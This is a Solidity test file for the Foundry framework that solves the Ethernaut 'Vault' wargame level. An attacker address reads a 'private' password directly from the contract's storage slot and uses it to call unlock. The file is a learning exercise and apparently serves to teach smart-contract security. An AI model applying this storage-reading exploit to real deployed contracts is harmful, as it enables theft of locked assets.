// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/core/Ethernaut.sol";
import "src/levels/08-Vault/VaultFactory.sol";

contract VaultTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up Vault level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_VaultExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        VaultFactory vaultFactory = new VaultFactory();

        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(eve);

        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultContract = Vault(levelAddress);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string("Starting the exploit... 🧨");
        emit log_string(
            "Eve reads the password from the storage slot number 1..."
        );

        bytes32 passwordFromStorage = vm.load(
            address(vaultContract),
            bytes32(uint256(1))
        );
        emit log_named_bytes32("Password in bytes32: ", passwordFromStorage);

        emit log_string("Converting password to human-readable form... 🤓");
        string memory passwordConverted = string(
            abi.encodePacked(passwordFromStorage)
        );
        emit log_named_string(
            "Password converted to string: ",
            passwordConverted
        );

        emit log_string(
            "Eve calls the unlock function with the aquired password... 🔑"
        );
        (bool success, ) = address(vaultContract).call(
            abi.encodeWithSignature("unlock(bytes32)", passwordFromStorage)
        );
        require(success, "Transaction failed");

        emit log_string("Vault lock cracked... 🔓");

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
